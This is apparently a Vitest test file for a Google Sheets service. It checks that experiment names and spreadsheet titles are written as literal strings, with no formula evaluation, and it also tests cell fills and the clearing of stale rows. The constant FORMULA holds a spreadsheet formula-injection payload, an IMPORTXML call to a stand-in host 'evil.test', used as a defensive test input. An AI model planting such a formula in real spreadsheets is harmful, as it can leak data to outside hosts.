import { afterEach, describe, expect, it, vi } from "vitest";

import { createSpreadsheet, overwriteWorksheet } from "@/server/services/google-sheets.service";

/**
 * Formula safety at the HTTP boundary: every write goes out with `valueInputOption=RAW` and the
 * customer's text exactly as typed. (`lib/sheet-rows.test.ts` covers the rows themselves.)
 */
const SPREADSHEET_ID = "1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms";
const FORMULA = '=IMPORTXML("http://evil.test/", "//a")';

function stubFetch(body: unknown) {
  const fetchMock = vi.fn(
    async (_url: string, _init?: RequestInit) =>
      new Response(JSON.stringify(body), {
        status: 200,
        headers: { "Content-Type": "application/json" },
      }),
  );
  vi.stubGlobal("fetch", fetchMock);
  return fetchMock;
}

afterEach(() => {
  vi.unstubAllGlobals();
});

interface SentCell {
  userEnteredValue?: { stringValue?: string; numberValue?: number; formulaValue?: string };
  userEnteredFormat?: { backgroundColor?: unknown };
}
interface SentUpdate {
  range: { sheetId: number; endRowIndex: number; endColumnIndex: number };
  rows: { values: SentCell[] }[];
  fields: string;
}

async function overwrite(rows: (string | number)[][], previousRowCount = 0, highlight = [0]) {
  const fetchMock = stubFetch({});
  await overwriteWorksheet("token", SPREADSHEET_ID, 1234, rows, previousRowCount, highlight);
  expect(fetchMock).toHaveBeenCalledTimes(1); // values and fills in one write
  const [url, init] = fetchMock.mock.calls[0]!;
  const sent = JSON.parse(String(init?.body)) as { requests: { updateCells: SentUpdate }[] };
  return { url, update: sent.requests[0]!.updateCells };
}

describe("overwriteWorksheet", () => {
  it("sends a formula-shaped experiment name as a literal string, never a formula", async () => {
    const { url, update } = await overwrite([
      ["Experiment", FORMULA, "Type", "A/B test", "Status", "Running", "Created"],
    ]);
    expect(url).toContain(":batchUpdate");
    expect(url).not.toContain("USER_ENTERED");
    const cell = update.rows[0]!.values[1]!;
    expect(cell.userEnteredValue).toEqual({ stringValue: FORMULA });
    expect(JSON.stringify(update)).not.toContain("formulaValue");
  });

  it("fills only the title rows, and clears the fill everywhere else it writes", async () => {
    const { update } = await overwrite(
      [
        ["Experiment", "A", "Type", "A/B test", "Status", "Running", "Created"],
        [
          "Date (UTC)",
          "Variant",
          "Visitors",
          "Conversions",
          "Conversion Rate (%)",
          "",
          "2026-10-26",
        ],
        ["2026-10-26", "Control", 7, 4, 57.1],
      ],
      0,
      [0],
    );
    expect(update.fields).toBe("userEnteredValue,userEnteredFormat.backgroundColor");
    const filled = update.rows.map(
      (row) => row.values.filter((c) => c.userEnteredFormat?.backgroundColor).length,
    );
    expect(filled).toEqual([7, 0, 0]); // the 7 title columns; column H (cleared) is not filled
    expect(update.rows[2]!.values[2]!.userEnteredValue).toEqual({ numberValue: 7 });
  });

  it("clears rows and columns an earlier, larger write left behind", async () => {
    const { update } = await overwrite([["No experiment activity in the last 30 days."]], 9, []);
    expect(update.range).toMatchObject({ sheetId: 1234, endRowIndex: 10, endColumnIndex: 8 });
    expect(update.rows).toHaveLength(10);
    expect(update.rows.slice(1).every((row) => row.values.every((c) => !c.userEnteredValue))).toBe(
      true,
    );
  });
});

describe("createSpreadsheet", () => {
  it("sends the customer's name as the title, unchanged", async () => {
    const fetchMock = stubFetch({
      spreadsheetId: SPREADSHEET_ID,
      properties: { title: FORMULA },
      sheets: [{ properties: { sheetId: 7, title: "Routely" } }],
    });
    await createSpreadsheet("token", FORMULA, "Routely").catch(() => undefined);

    const [, init] = fetchMock.mock.calls[0]!;
    const sent = JSON.parse(String(init?.body)) as { properties: { title: string } };
    expect(sent.properties.title).toBe(FORMULA);
  });
});
